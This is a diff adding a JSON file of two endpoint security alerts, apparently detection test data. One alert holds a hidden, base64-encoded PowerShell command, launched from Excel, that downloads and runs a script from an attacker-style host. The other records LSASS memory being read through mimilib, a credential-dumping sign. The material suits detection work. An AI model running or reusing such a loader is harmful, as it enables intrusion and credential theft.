@@ -1,0 +1,39 @@
+{
+  "alerts": [
+    {
+      "timestamp": "2026-11-02T12:00:14.218Z",
+      "rule": {
+        "id": "100231",
+        "level": 12,
+        "description": "Suspicious PowerShell command execution with encoded payload"
+      },
+      "agent": {
+        "id": "002",
+        "name": "ws-01",
+        "ip": "10.0.2.15"
+      },
+      "data": {
+        "process_id": "4812",
+        "parent_process": "excel.exe",
+        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAHUAcABkAGEAdABlAC4AbgBlAHQALwBzAC4AcABzADEAJwApAA=="
+      }
+    },
+    {
+      "timestamp": "2026-11-02T12:02:19.401Z",
+      "rule": {
+        "id": "100512",
+        "level": 14,
+        "description": "LSASS memory handle accessed with PROCESS_VM_READ permissions"
+      },
+      "agent": {
+        "id": "002",
+        "name": "ws-01",
+        "ip": "10.0.2.15"
+      },
+      "data": {
+        "target_process": "lsass.exe",
+        "call_trace": "ntdll.dll!NtOpenProcess+0x14|kernelbase.dll!OpenProcess+0x42|mimilib.dll+0x21a0"
+      }
+    }
+  ]
+}
